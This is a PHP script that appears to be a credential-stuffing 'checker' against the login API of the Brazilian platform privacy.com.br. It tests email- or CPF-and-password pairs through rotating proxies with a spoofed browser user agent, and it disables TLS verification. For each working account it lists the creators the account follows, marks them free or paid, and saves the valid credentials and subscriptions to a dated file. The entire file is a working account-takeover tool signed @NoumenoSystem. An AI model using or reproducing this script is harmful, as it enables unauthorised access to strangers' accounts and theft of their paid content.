<?php
error_reporting(0);
date_default_timezone_set("America/Sao_Paulo");

 $cookieFile = __DIR__ . '/priva.txt';

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$chromeMajor = rand(138, 139);
$build = rand(0, 200);
$patch = rand(0, 200);
$useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$chromeMajor}.0.{$build}.{$patch} Safari/537.36";

$lista = $_GET['lista'];
$separar = explode(":", $lista);
$user = $separar[0];
$senha = $separar[1];

if (ctype_alpha($user[0])) {
    $tipo = 'email';
} elseif (ctype_digit($user[0])) {
    $tipo = 'cpf';
} else {
    $tipo = 'desconhecido';
}

// minha nota: coloque suas proxies para nao queimad o ip, coloque no minimo de 10 a 20 para rodar normal.

function getProxy() {
    $proxies = [
        "dominio:porta:user:senha",
        "dominio:porta:user:senha"
    ];

    return $proxies[array_rand($proxies)];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://httpbin.org/ip");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$proxy = getProxy();
$parts = explode(":", $proxy);

if ($tipo == 'email') {
    $doc = 'null';
    $email = '"'.$user.'"';
} else {
    $doc = '"'.$user.'"';
    $email  = "null";
}

$reprovado = '[❌️] Reprovada | '.$user.':'.$senha.'';
$aprovado = '[✅️] Aprovada | '.$user.':'.$senha.'';

$erro = '[⚠️] Erro | '.$user.':'.$senha.' | Erro ao obter resposta, ou conta bloqueda';

$curl = curl_init();

curl_setopt_array($curl, [
    CURLOPT_URL => "https://service.privacy.com.br/auth/login",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIEJAR => $cookieFile,
    CURLOPT_COOKIEFILE => $cookieFile,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_PROXYTYPE      => CURLPROXY_HTTP,
    CURLOPT_TIMEOUT        => 30,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_HTTPHEADER => [
        "authority: service.privacy.com.br",
        "accept: application/json, text/plain, */*",
        "accept-language: pt-BR",
        "content-type: application/json",
        "origin: https://privacy.com.br",
        "referer: https://privacy.com.br/",
        "user-agent: $useragent",
    ],
    CURLOPT_POSTFIELDS => '{"Email":'.$email.',"Document":'.$doc.',"Password":"'.$senha.'","Locale":"pt-BR","CanReceiveEmail":false}',
]);

if (count($parts) === 4) {
    $options[CURLOPT_PROXY]     = $parts[0] . ":" . $parts[1];
    $options[CURLOPT_PROXYUSERPWD] = $parts[2] . ":" . $parts[3];
} else {
    $options[CURLOPT_PROXY] = $parts[0] . ":" . $parts[1];
}

curl_setopt_array($ch, $options);

$login = curl_exec($curl);
$err = curl_error($curl);
$token = puxar($login, '"token":"','"');
$retorn = puxar($login, '"errorKey":"','"');


if($login == null) {
    echo $erro;
    exit();
}elseif (strpos($login, 'error code: 1015') !== false) {
  echo  '[⚠️] Erro  | '.$user.':'.$senha.' | Erro, ip queimado verifique as proxies';
  exit();
}


if (strpos($login, '"token":"') !== false) {
    
    usleep(500000);
    
    
    $curl = curl_init();
    curl_setopt_array($curl, [
    CURLOPT_URL => "https://privacy.com.br/strangler/Authorize?TokenV1=$token",
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIEJAR => $cookieFile,
    CURLOPT_COOKIEFILE => $cookieFile,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
    CURLOPT_TIMEOUT        => 30,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => [
        "authority: privacy.com.br",
        "accept: application/json, text/plain, */*",
        "accept-language: pt-BR",
        "referer: https://privacy.com.br/auth?route=sign-in",
        "user-agent: $useragent",
    ],
]);
     if (count($parts) === 4) {
     $options[CURLOPT_PROXY]     = $parts[0] . ":" . $parts[1];
    $options[CURLOPT_PROXYUSERPWD] = $parts[2] . ":" . $parts[3];
    } else {
    $options[CURLOPT_PROXY] = $parts[0] . ":" . $parts[1];
}
curl_setopt_array($ch, $options);
$autoriToken = curl_exec($curl);
    
    

curl_setopt_array($curl, [
    CURLOPT_URL => "https://service.privacy.com.br/profile/UserFollowing?page=0&limit=30&nickName=",
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_PROXYTYPE      => CURLPROXY_HTTP,
    CURLOPT_HTTPHEADER => [
        "authority: service.privacy.com.br",
        "accept: application/json, text/plain, */*",
        "authorization: Bearer $token",
        "origin: https://privacy.com.br",
        "referer: https://privacy.com.br/",
        "user-agent: $useragent",
    ],
]);
     if (count($parts) === 4) {
     $options[CURLOPT_PROXY]     = $parts[0] . ":" . $parts[1];
    $options[CURLOPT_PROXYUSERPWD] = $parts[2] . ":" . $parts[3];
    } else {
    $options[CURLOPT_PROXY] = $parts[0] . ":" . $parts[1];
}
curl_setopt_array($ch, $options);
$response = curl_exec($curl);

$json = json_decode($response, true);

$listaFormatada = [];

foreach ($json as $item) {
    $nome = trim($item['profileName']);
    $status = ($item['isFree'] == true) ? '[Free]' : '[Pago]';
    $lista1[] = $nome . " | " . $status;
}

$lista = implode("<br>", $lista1);

$data = date("d-m-Y");

file_put_contents(
    "privacy" . $data . ".txt",
 "" . $user . " | " . $senha . " | " . $lista . " | @NoumenoSystem" . PHP_EOL,
    FILE_APPEND
);

echo $aprovado . "\nassinaturas |\n <br>" . $lista . "<br>@NoumenoSystem";

}else {
    echo $reprovado . "\n[$retorn]\n" . "@NoumenoSystem";
}


?>